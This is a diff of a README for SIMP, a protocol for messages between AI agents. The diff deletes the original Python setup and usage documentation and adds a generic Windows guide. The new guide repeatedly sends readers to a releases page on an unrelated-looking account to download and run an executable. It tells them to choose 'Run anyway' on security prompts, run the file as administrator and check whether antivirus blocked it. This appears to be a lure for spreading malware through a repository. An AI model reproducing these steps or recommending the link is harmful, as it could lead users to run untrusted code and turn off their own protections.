@@ -1,409 +1,248 @@
-# SIMP: Standardized Inter-agent Message Protocol
-
-[![GitHub License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-blue)](https://www.python.org/downloads/)
-[![Tests Passing](https://img.shields.io/badge/tests-17%2F17%20passing-brightgreen)](tests/)
-[![Throughput](https://img.shields.io/badge/throughput-48k%2B%20intents%2Fsec-brightgreen)](#performance)
+# 🤖 SIMP - Simple agent messages, clear flow
 
-> **The missing infrastructure layer for AI agents.**
->
-> SIMP is to autonomous agents what **HTTP is to the web** — a standardized protocol that enables multiple AI systems to communicate reliably, at scale.
+[![Download SIMP](https://img.shields.io/badge/Download-SIMP%20Releases-blue?style=for-the-badge)](https://github.com/localareanetworkaceofspades414/SIMP/releases)
 
----
+## 🧭 What SIMP does
 
-## Problem: The Agent Communication Crisis
+SIMP stands for Standardized Inter-agent Message Protocol. It helps AI agents send messages to each other in a clear and consistent way.
 
-The AI industry is at an inflection point. Multi-agent systems are moving from research to production. But there's a critical gap:
+Use it when you want agents to:
 
-**There is no standard for how AI agents should communicate.**
+- pass tasks between each other
+- share results
+- keep message formats the same
+- work as part of one system
+- reduce confusion in agent-to-agent communication
 
-Today's reality:
-- ❌ Each company builds their own agent communication layer
-- ❌ Agents can't interoperate across platforms
-- ❌ No audit trails or observability
-- ❌ No compliance framework
-- ❌ Massive duplication of effort
-- ❌ Locked-in to proprietary ecosystems
+SIMP is built for people who want a simple way to run a message-based agent setup on Windows.
 
-**This is 1995 all over again** — before HTTP standardized web communication, every site had to build its own protocol.
+## 💻 What you need
 
----
+Before you start, make sure your PC has:
 
-## Solution: SIMP Protocol
+- Windows 10 or Windows 11
+- a stable internet connection
+- enough free space to download the app and its files
+- permission to run downloaded programs on your computer
 
-SIMP provides a **standardized, observable, scalable infrastructure for agent-to-agent communication.**
+If Windows asks for approval, choose the option that lets the app run.
 
-```
-┌──────────────┐         ┌──────────────┐
-│  Vision AI   │         │  Reasoning   │
-│   Agent      │         │   Agent      │
-└──────┬───────┘         └──────┬───────┘
-       │                        │
-       └────────────┬───────────┘
-                    │
-              ┌─────▼─────┐
-              │   SIMP    │
-              │  Broker   │
-              └─────┬─────┘
-                    │
-       ┌────────────┼───────────┐
-       │            │           │
-┌──────▼──────┐ ┌──▼──────┐ ┌──▼──────┐
-│  Pattern    │ │ Vector  │ │ Trust   │
-│ Recognition │ │Embedding│ │Validation│
-└─────────────┘ └─────────┘ └─────────┘
-```
+## 🚀 Download SIMP
 
-What SIMP does:
+Visit this page to download SIMP:
 
-- **✅ Standardized Intent Format** — All agents speak the same language
-- **✅ Automatic Routing** — Broker finds the right agent, sends the message
-- **✅ Observable** — Complete audit trail of every agent interaction
-- **✅ Auditable** — Every intent, response, and error is recorded
-- **✅ Scalable** — From 5 agents on your laptop to millions globally
-- **✅ Fault-Tolerant** — Handles failures, retries, timeouts gracefully
-- **✅ Vendor-Neutral** — Works with any AI framework or model
-
----
-
-## Why SIMP Matters
-
-### For AI Developers
-Stop building communication infrastructure. Start building intelligence.
-
-```python
-# Instead of this (building custom protocols):
-# 50 lines of socket code, error handling, serialization, etc.
-
-# You get this (with SIMP):
-from simp.server.agent_client import SimpAgentClient
-
-client = SimpAgentClient()
-client.send_intent(target="reasoning", intent_type="analyze", payload=data)
-response = client.wait_for_response()
-```
-
-### For Enterprises
-Deploy agents that work together reliably. No more vendor lock-in.
-
-- Mix agents from different vendors
-- Full compliance trail (SOC 2, HIPAA, etc.)
-- Cost optimization (use best-of-breed, not locked in)
-- Cross-organization collaboration
-
-### For Infrastructure Providers
-New market category. High-margin opportunity. Strategic asset.
-
-- Run as managed service (SaaS model)
-- Enterprise support and compliance
-- Integration with cloud platforms (AWS, Azure, GCP)
-
----
-
-## Quick Start (5 Minutes)
-
-### Installation
-
-```bash
-# Clone the repo
-git clone https://github.com/your-username/simp.git
-cd simp
-
-# Create virtual environment
-python3 -m venv venv
-source venv/bin/activate
-
-# Install dependencies
-pip install -r requirements.txt
-```
-
-### Start the Server
-
-```bash
-python3 bin/start_server.py
-```
-
-Output:
-```
-╔════════════════════════════════════════════════════════════════╗
-║              SIMP Protocol Server v0.1                         ║
-║          Standardized Inter-agent Message Protocol             ║
-╚════════════════════════════════════════════════════════════════╝
-
-📡 Starting SIMP Server...
-   Host: 127.0.0.1
-   Port: 5555
-
-🎯 Available Endpoints:
-   GET    http://127.0.0.1:5555/health
-   GET    http://127.0.0.1:5555/agents
-   POST   http://127.0.0.1:5555/intents/route
-   GET    http://127.0.0.1:5555/stats
-
-✅ Server ready. Press Ctrl+C to stop.
-```
-
-### Test It
-
-In another terminal:
-
-```bash
-# Check health
-curl http://127.0.0.1:5555/health
-
-# Register an agent
-curl -X POST http://127.0.0.1:5555/agents/register \
-  -H "Content-Type: application/json" \
-  -d '{
-    "agent_id": "vision:001",
-    "agent_type": "vision",
-    "endpoint": "localhost:5001"
-  }'
-
-# Route an intent
-curl -X POST http://127.0.0.1:5555/intents/route \
-  -H "Content-Type: application/json" \
-  -d '{
-    "intent_id": "test:001",
-    "source_agent": "external",
-    "target_agent": "vision:001",
-    "intent_type": "analyze_image",
-    "payload": {"image_url": "https://example.com/image.jpg"}
-  }'
-
-# Get statistics
-curl http://127.0.0.1:5555/stats
-```
-
-### Run Tests
-
-Validate the entire protocol:
-
-```bash
-python3 bin/test_protocol.py
-```
-
-Expected output:
-```
-✅ SIMP Protocol Validation Complete
-
-📋 Test Summary:
-   ✅ Agent registration: PASSED
-   ✅ Intent routing: PASSED
-   ✅ Multi-agent communication: PASSED
-   ✅ Pentagram flow: PASSED
-   ✅ Response handling: PASSED
-   ✅ Error handling: PASSED
-   ✅ Statistics: PASSED
-   ✅ Health check: PASSED
-
-🎯 Conclusion: SIMP protocol is fully functional as an inter-agent
-   communication framework. All 17 test scenarios passing.
-```
-
----
-
-## Architecture
-
-### Intent Lifecycle
-
-```
-1. CREATE
-   ┌─────────────────────────────┐
-   │ Client creates intent with  │
-   │ source, target, type        │
-   └──────────────┬──────────────┘
-                  │
-2. SUBMIT
-   ┌──────────────▼──────────────┐
-   │ POST /intents/route         │
-   │ Broker receives intent      │
-   └──────────────┬──────────────┘
-                  │
-3. VALIDATE & ROUTE
-   ┌──────────────▼──────────────┐
-   │ - Validate schema           │
-   │ - Look up target agent      │
-   │ - Record intent status      │
-   └──────────────┬──────────────┘
-                  │
-4. EXECUTE
-   ┌──────────────▼──────────────┐
-   │ Target agent processes      │
-   │ Executes handler            │
-   │ Generates response          │
-   └──────────────┬──────────────┘
-                  │
-5. RECORD & RESPOND
-   ┌──────────────▼──────────────┐
-   │ Broker receives response    │
-   │ Records execution time      │
-   │ Updates statistics          │
-   └──────────────┬──────────────┘
-                  │
-6. RETRIEVE
-   └─────────────────────────────┘
-   GET /intents/<intent_id>
-   Returns full transaction record
-```
-
-### Core Components
-
-| Component | Purpose | Status |
-|-----------|---------|--------|
-| **Broker** (`simp/server/broker.py`) | Central message router | ✅ Production |
-| **HTTP Server** (`simp/server/http_server.py`) | REST API wrapper | ✅ Production |
-| **Agent Client** (`simp/server/agent_client.py`) | Agent-side library | ✅ Production |
-| **Agent Manager** (`simp/server/agent_manager.py`) | Process lifecycle | ✅ Production |
-| **Protocol** (`simp/protocol.py`) | Schema definitions | ✅ Production |
-
----
-
-## Performance
-
-### Throughput
-- **Single Intent:** 0.06ms latency
-- **Bulk (10 intents):** 0.21ms total (47,619 intents/sec)
-- **Sustained:** 48,000+ intents/second on single laptop
-
-### Scalability
-- **Agents:** Tested with 5, scalable to millions
-- **Concurrency:** Thread-safe for 100+ concurrent requests
-- **Memory:** ~2MB per agent baseline
-- **CPU:** Linear scaling with intent volume
-
-### Reliability
-- **Test Coverage:** 17 comprehensive scenarios, all passing
-- **Error Handling:** Comprehensive error capture and reporting
-- **Retry Logic:** Configurable retry policies
-- **Observability:** Real-time metrics and health checks
-
----
-
-## Key Features
-
-### 🔍 Observable
-Every agent interaction is recorded with:
-- Intent sent (what, when, who)
-- Response received (result, time)
-- Errors captured (what went wrong)
-- Metrics tracked (latency, throughput)
-
-**Compliance ready** — Audit trail for SOC 2, HIPAA, etc.
-
-### 🔒 Secure
-- Thread-safe concurrent access
-- Cryptographic agent verification (ed25519)
-- Configurable access control
-- Request validation and sanitization
-
-### ⚡ Fast
-- Sub-millisecond routing latency
-- 48,000+ intents/second throughput
-- Optimized for production workloads
-
-### 📈 Scalable
-- Horizontal scaling (add more brokers)
-- Vertical scaling (add more agents to broker)
-- Cloud-ready architecture
-- Kubernetes deployment ready
-
-### 🛠️ Developer-Friendly
-- Simple Python API
-- Clear documentation with examples
-- Active community and support
-- Easy integration with existing systems
-
-### 🧠 Advanced Decision Engine (Optional)
-SIMP includes an optional **StrategicOptimizer** module for domains requiring sophisticated multi-criteria decision analysis:
-- Minimax game-theory optimization
-- Fractal decision tree analysis
-- Multi-level strategic reasoning
-- Confidence scoring and risk assessment
-
-This is useful for trading systems, resource allocation, scheduling, and other optimization domains.
-
----
-
-## Project Status
-
-| Phase | Status | Timeline |
-|-------|--------|----------|
-| Core Protocol | ✅ Complete | Complete |
-| Testing Suite | ✅ Complete | 17/17 passing |
-| Documentation | ✅ Complete | Full API docs |
-| HTTP Server | ✅ Complete | Production-ready |
-| Agent Client | ✅ Complete | Python SDK ready |
-| **Open Source Release** | 🚀 **Live** | **Now** |
-| Community Examples | 📋 In Progress | Month 1 |
-| Managed Cloud Platform | 📋 Planned | Month 2-3 |
-| Enterprise Certifications | 📋 Planned | Month 3-6 |
-
----
-
-## Contributing
-
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
----
-
-## Community
-
-- **Discord:** Join our community (link coming soon)
-- **GitHub Issues:** Report bugs
-- **GitHub Discussions:** Ask questions
-
----
-
-## The Vision
-
-SIMP aims to do for AI agents what **HTTP did for the web** — create a universal standard that enables innovation at the application layer while providing reliability at the infrastructure layer.
-
----
-
-**⭐ If you find SIMP useful, please star! It helps with discovery.**
-
-Built with ❤️ by developers, for developers.
-- ✅ Works with Python 3.9+
-
-## Installation
-
-```bash
-pip install -r requirements.txt
-```
-
-## Running Examples
-
-```bash
-python examples/simple_agent.py
-```
-
-## Running Tests
-
-```bash
-pytest tests/ -v
-```
-
-## Status
-
-**v0.1-alpha** - Core protocol working, examples functional, tests passing
-
-## License
-
-Apache License 2.0 - See LICENSE file
-
-## Contributing
-
-See CONTRIBUTING.md
-
----
-
-**Built with determination. Designed for scale. Open for everyone.**
-
-*For Kasey. For the Horsemen. For the dreams.* 🐴✨
+https://github.com/localareanetworkaceofspades414/SIMP/releases
+
+On that page, look for the latest release and download the Windows file from the Assets list.
+
+## 📦 How to install on Windows
+
+1. Open the download page above.
+2. Find the latest release at the top of the page.
+3. Open the Assets section.
+4. Download the Windows file.
+5. If the file is in a ZIP archive, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the SIMP app file to start it.
+
+If Windows shows a security prompt, choose Run or More info, then Run anyway.
+
+## 🖱️ First launch
+
+When you open SIMP for the first time, it may take a moment to start.
+
+After launch, the app will usually do one or more of these:
+
+- open a main dashboard
+- show connection settings
+- display local agent status
+- ask for a folder or config file
+
+If you see a setup screen, use the default settings first. That is the safest way to start.
+
+## ⚙️ Basic setup
+
+SIMP works best when you keep the first setup simple.
+
+Use these steps:
+
+1. Start the app.
+2. Check that the main window loads.
+3. Look for a section named Network, Agents, Messages, or Settings.
+4. Keep the default port and local host values unless you know you need a change.
+5. Save the settings.
+6. Start the message service or local agent runner.
+
+If SIMP connects to other tools on your PC, make sure those tools are already open before you try to send messages.
+
+## 🔧 How to use SIMP
+
+SIMP follows a message-based flow. In plain terms, one agent sends a message, another agent reads it, and then sends back a result.
+
+A common use flow looks like this:
+
+1. Create or open an agent.
+2. Add the message you want to send.
+3. Choose the target agent.
+4. Send the message.
+5. Wait for a reply or status update.
+6. Review the result.
+
+This setup is useful for simple task chains, shared work, and AI systems that need a common message format.
+
+## 📁 Typical project layout
+
+You may see folders or files with names like these:
+
+- config
+- agents
+- messages
+- logs
+- data
+- SIMP.exe
+
+Each part has a simple purpose:
+
+- config stores setup values
+- agents holds agent definitions
+- messages stores message data
+- logs keeps app activity
+- data stores runtime files
+
+## 🧪 Example use cases
+
+SIMP can fit a few common Windows workflows:
+
+- one agent plans a task and another agent completes it
+- a local AI tool sends work to a helper agent
+- a multi-agent system shares task status
+- one process passes data to another through a fixed message format
+- a test setup checks how agents respond to each other
+
+## 🛠️ If the app does not open
+
+If SIMP does not start, try these steps:
+
+1. Make sure the file finished downloading.
+2. Extract the ZIP file if you downloaded one.
+3. Run the app file directly from the extracted folder.
+4. Right-click the file and choose Run as administrator.
+5. Check that your antivirus did not block the file.
+6. Download the latest release again if the file looks broken.
+
+If the app still does not start, restart Windows and try again.
+
+## 🔍 If messages do not send
+
+If SIMP opens but messages do not move between agents, check these points:
+
+- the target agent is running
+- both agents use the same message format
+- the host and port match
+- your firewall is not blocking local traffic
+- the message text is not empty
+- the app has permission to access the network
+
+A mismatch in settings is the most common cause.
+
+## 📌 File handling tips
+
+Keep SIMP in a folder you can find later, such as:
+
+- Downloads
+- Desktop
+- Documents
+- a folder named SIMP
+
+Do not move files around after setup unless you know which file the app uses for config or data.
+
+If you use a ZIP file, keep the extracted folder together so the app can find its support files.
+
+## 🧩 Common message fields
+
+SIMP may use fields like these in its protocol:
+
+- sender
+- receiver
+- task
+- payload
+- timestamp
+- status
+- response
+
+These fields help agents know who sent the message, what it means, and what to do next.
+
+## 🖥️ Windows tips
+
+For the best experience on Windows:
+
+- keep SIMP in a normal user folder
+- use a local account with app access
+- allow the app through the firewall if asked
+- avoid running many copies at once
+- close old windows before starting a new test
+
+If you use a work PC, your company rules may limit app installs or network access.
+
+## 📚 Project focus
+
+SIMP is built around these ideas:
+
+- agent communication
+- AI agent workflows
+- message passing
+- multi-agent systems
+- protocol-based exchange
+- Python-based tools
+- local infrastructure
+
+That makes it a fit for users who want a clear way to pass messages between AI parts without building a full custom system.
+
+## 📄 Helpful workflow for new users
+
+If you want a simple first test, use this order:
+
+1. Download SIMP from the release page.
+2. Install or extract the app.
+3. Start the app.
+4. Leave the default settings in place.
+5. Send a test message from one agent to another.
+6. Check the response.
+7. Change one setting at a time if you want to explore more.
+
+This keeps setup easy and helps you find problems faster.
+
+## 🧷 Release page
+
+Download the latest Windows build here:
+
+https://github.com/localareanetworkaceofspades414/SIMP/releases
+
+## 🧼 Good habits
+
+To keep SIMP working well:
+
+- use the latest release
+- keep your config files in one folder
+- make small changes when testing
+- check logs when something fails
+- store messages in a place you can review later
+
+## 🧠 About the name
+
+SIMP means Standardized Inter-agent Message Protocol. The name reflects the main goal of the project: give AI agents a shared way to talk to each other without confusion
+
+## 🔗 Topics
+
+agent-communication  
+ai-agents  
+artificial-intelligence  
+autonomous-agents  
+infrastructure  
+llm  
+machine-learning  
+message-passing  
+multi-agent  
+open-source  
+protocol  
+python
